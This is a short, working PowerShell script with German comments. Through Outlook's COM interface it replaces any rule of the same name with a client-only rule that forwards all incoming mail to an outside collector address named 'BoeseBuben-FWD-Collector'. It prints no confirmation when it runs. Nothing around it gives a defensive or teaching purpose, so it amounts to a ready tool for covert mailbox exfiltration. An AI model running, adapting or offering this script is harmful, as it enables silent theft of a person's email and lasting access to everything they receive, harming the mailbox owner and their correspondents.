$outlook = New-Object -ComObject Outlook.Application
$session = $outlook.Session;$store = $session.DefaultStore
$rules = $store.GetRules()
$ruleName = "Forward All Mails (Outlook Only)"
$targetMail = "BoeseBuben-FWD-Collector@SchwingSchleiferUnited.eu"
for ($i = $rules.Count; $i -ge 1; $i--) { 
   try {
        $r = $rules.Item($i)
        if ($null -ne $r -and $r.Name -eq $ruleName) {
            $rules.Remove($i)
        }
    }
    catch {
        # einzelne defekte/unlesbare Rule ignorieren
        continue
    }
}

# 0 = olRuleReceive
$rule = $rules.Create($ruleName, 0)

# Outlook-only / client-only
$rule.Conditions.OnLocalMachine.Enabled = $true

# Forward action
$null = $rule.Actions.Forward.Recipients.Add($targetMail)
$rule.Actions.Forward.Recipients.ResolveAll() | Out-Null
$rule.Actions.Forward.Enabled = $true

$rule.Enabled = $true
$rules.Save()

#Write-Host "Outlook-only forward rule created: $ruleName -> $targetMail"

# Cleanup COM
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($rules)
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($store)
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($session)
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($outlook)
